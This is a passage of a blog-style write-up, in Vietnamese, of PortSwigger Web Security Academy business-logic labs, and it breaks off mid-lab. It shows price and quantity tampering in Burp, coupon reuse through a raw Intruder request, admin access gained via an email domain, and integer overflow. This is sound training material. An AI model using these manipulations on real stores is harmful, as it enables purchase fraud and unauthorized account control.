@@ -1,0 +1,1791 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/Business%20logic%20vulnerabilities/">
+      
+      
+        <link rel="prev" href="../Authentication%20vulnerabilities/">
+      
+      
+        <link rel="next" href="../File%20upload%20vulnerabilities/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Business Logic - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#business-logic-vulnerabilities" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Business Logic
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="business-logic-vulnerabilities">Business logic vulnerabilities<a class="headerlink" href="#business-logic-vulnerabilities" title="Permanent link">&para;</a></h1>
+<h1 id="lab-excessive-trust-in-client-side-controls"><strong>Lab: Excessive trust in client-side controls</strong><a class="headerlink" href="#lab-excessive-trust-in-client-side-controls" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls">Lab: Excessive trust in client-side controls | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào tài khoản <code>wiener:peter</code>.</li>
+<li>Thực hiện chọn sản phẩm <code>Lightweight "l33t" Leather Jacket</code></li>
+<li>
+<p>Tại đây, chọn một số lượng hợp lệ và thêm vào giỏ hàng</p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm BurpSuite, thực hiện bắt Request gửi tới API <code>POST /cart</code>. Tại đây, thực hiện chỉnh sửa param <code>price</code> thành giá trị theo ý muốn (thường là sẽ chọn nhỏ hơn, ở đây nếu để số âm thì server sẽ cho rằng không hợp lệ nên sẽ chọn số dương)</p>
+<ul>
+<li>
+<p>Request</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Điều hướng đến chức năng <code>Giỏ hàng</code></p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+<li>
+<p>Tại đây, quan sát thấy giá hàng đã bị thay đổi theo input người dùng</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+<li>
+<p>Thực hiện mua sản phẩm. Quan sát thấy đã mua sản phẩm thành công với giá trị thấp hơn ban đầu. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+</ul>
+<h1 id="lab-high-level-logic-vulnerability"><strong>Lab: High-level logic vulnerability</strong><a class="headerlink" href="#lab-high-level-logic-vulnerability" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level">Lab: High-level logic vulnerability | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login bằng user <code>wiener:peter</code>.</li>
+<li>
+<p>Thực hiện chọn một sản phẩm cần mua. Thêm vào giỏ hàng.</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt Request gửi tới API <code>POST /cart</code> và chỉnh sửa param <code>quantity</code> thành số âm.</p>
+<ul>
+<li>
+<p>Request</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Điều hướng đến chức năng <code>Giỏ hàng</code>.</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+<li>
+<p>Tại đây, quan sát thấy giá tiền tổng sản phẩm là số âm</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+<li>
+<p>Tuy nhiên chúng ta không được phép thanh toán với số tiền âm. Vì vậy, chúng ta chỉ có thể giảm tổng tiền mua bằng cách mua một sản phẩm với giá tiền âm và sản phẩm còn lại là dương. Khi đó chúng ta có thể mua hàng với giá nhỏ hơn giá ban đầu.</p>
+</li>
+<li>
+<p>Thực hiện thay đổi số lượng sản phẩm để khi cộng tổng thì giá sẽ nhỏ hơn số tiền chúng ta có như sau:</p>
+<ul>
+<li>
+<p>Thực hiện tạo sản phấm với số tiền âm phù hợp bằng cách chỉnh sửa quantity của API <code>POST /cart</code></p>
+<ul>
+<li>
+<p>Request</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Quan sát giao diện, nhận thấy tổng tiền đã được trừ</p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+<li>
+<p>Thực hiện thanh toán thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-inconsistent-security-controls"><strong>Lab: Inconsistent security controls</strong><a class="headerlink" href="#lab-inconsistent-security-controls" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls">Lab: Inconsistent security controls | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện đăng ký với account bất kỳ bằng email có sẵn.</li>
+<li>Thực hiện login với account đã đăng ký.</li>
+<li>
+<p>Điều hướng đến chức năng <code>My account</code></p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện update email với domain là <code>@dontwannacry.com</code></p>
+</li>
+<li>
+<p>Thực hiện update email thành công. Quan sát thấy có <code>Admin panel</code> hiện ra</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+<li>
+<p>Thực hiện xóa user <code>Carlos</code> thành công bằng quyền admin. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+<h1 id="lab-flawed-enforcement-of-business-rules"><strong>Lab: Flawed enforcement of business rules</strong><a class="headerlink" href="#lab-flawed-enforcement-of-business-rules" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules">Lab: Flawed enforcement of business rules | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào user <code>wiener:peter</code></li>
+<li>
+<p>Thực hiện chọn mua một sản phẩm. Tiến hành thanh toán với 2 coupon lấy được là <code>NEWCUST5</code> và <code>SIGNUP30</code> .</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+<li>
+<p>Ở đây, có một bug logic đó là server chỉ kiểm tra coupon gần nhất sử dụng nhờ đó 1 counpon có thể dùng nhiều lần.</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+<li>
+<p>Sau đó, thực hiện chọn mua sản phẩm <code>Lightweight "l33t" Leather Jacket</code> . Áp dụng counpon theo cách trên → giảm giá còn $0.00</p>
+<ul>
+<li>
+<p>Sử dụng BurpIntruder để áp dụng nhanh coupon</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">cart</span><span class="o">/</span><span class="nx">coupon</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">abc002004f814778532199700590095</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">Cq6gNlltAEXGa0jz14NLTbtXlHwOXkTx</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">53</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0abc002004f814778532199700590095.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0abc002004f814778532199700590095.web-security-academy.net/cart?couponError=COUPON_ALREADY_APPLIED&amp;coupon=NEWCUST5</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">OK9adADQ5HRkm2jKBmK4fDNBf6Dd5x3s</span><span class="o">&amp;</span><span class="nx">coupon</span><span class="o">=</span><span class="nx">SIGNUP30</span>
+</code></pre></div>
+</li>
+<li>
+<p>Setting</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Quan sát tại vị trí đặt hàng đã giảm số tiền về 0</p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+<li>
+<p>Tiến hành đặt hàng và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+<h1 id="lab-low-level-logic-flaw"><strong>Lab: Low-level logic flaw</strong><a class="headerlink" href="#lab-low-level-logic-flaw" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level">Lab: Low-level logic flaw | Web Security Academy</a></p>
+<ul>
+<li>Trước hết, login vào tài khoản <code>wiener:peter</code> .</li>
+<li>Thực hiện chọn 1 sản phẩm. Thêm sản phẩm đó vào giỏ hàng.</li>
+<li>Trong phần mềm Burpsuite, thực hiện bắt Request gửi tới API <code>POST /cart</code> . Tại  đây, phía backend kiểm tra giá trị <code>quantity</code> nếu lớn hơn <code>99</code> sẽ không hợp lệ. Tuy nhiên, người dùng lại có thể cộng dồn <code>quantity</code> → nếu vượt qua giới hạn của biến thì có gây ra số âm → số tiền âm → giảm tổng tiền.</li>
+<li>
+<p>Trước hết, dùng BurpIntruder để gửi Request tới API <code>POST /cart</code> nhiều lần, quan sát thấy sau một số lần đủ lớn, số tiền đã trở thành âm.</p>
+<ul>
+<li>
+<p>Request</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+<li>
+<p>POC số tiền âm</p>
